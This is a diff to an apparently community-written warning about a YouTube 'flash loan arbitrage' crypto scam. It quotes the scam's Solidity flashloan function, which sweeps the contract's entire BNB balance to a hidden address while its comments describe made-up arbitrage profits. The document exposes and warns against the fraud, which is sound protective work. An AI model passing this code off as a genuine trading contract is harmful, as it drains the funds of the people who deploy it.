@@ -31,6 +31,8 @@ Code in the "Router" contract are commented out and done using the `/*` method i
     }
 ```
 
+![Screenshot from 2021-07-05 11-21-05](https://user-images.githubusercontent.com/8411406/124405982-6501c080-dd83-11eb-82dd-779f54591bf4.png)
+
 Lots of methods are simply commented out or do nothing, such as 
 
 ```
@@ -38,6 +40,36 @@ Lots of methods are simply commented out or do nothing, such as
     function completeTransation(uint256 balanceAmount) public pure {
         require(balanceAmount >= 0, "Amount should be greater than 0!");
     }
+```
+
+## Concern 5:  SENDING ALL THE ETH!
+In the method "flashloan", LN44 sweeps the entire amount of the Ethereum in the contract.  The premis of the video is to use borrowed funds, not your own ETH to attack defi contracts such as UniSwap.
+
+* NOTE THE AUTHOUR OF THE VIDEO ASKS YOU TO FUND THE CONTRACT.  In otherwords, he will sweep this ETH.  In the video at 5:12 https://youtu.be/HynfsKoFlaw?t=312 the other funds his contract with 0.2 BNB.  This is what will be swept from you.
+
+```
+	function flashloan() public payable {
+    	// Send required coins for swap
+    	address(uint160(router.pancakeSwapAddress())).transfer(
+        	address(this).balance
+    	);
+
+    	//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+    	router.borrowFlashloanFromMultiplier(
+        	address(this),
+        	router.bakerySwapAddress(),
+        	flashLoanAmount
+    	);
+
+    	//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+    	router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
+    	//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+    	router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
+    	//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+    	router.transferBnbToMultiplier(router.pancakeSwapAddress());
+    	//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+    	router.completeTransation(address(this).balance);
+	}
 ```
 
 # Socials 
@@ -50,3 +82,6 @@ There are profiles such as "Marcus Canton" with no profile image commenting "Ama
 
 ![Screenshot from 2021-07-05 11-07-01](https://user-images.githubusercontent.com/8411406/124405446-038d2200-dd82-11eb-80d0-dad085fabfba.png)
 
+
+# Final words
+Stay safe out there!  Visit real meetups like www.bitcoinbrisbane.com.au or meetup.com/bitcoinbrisbane to get real information.
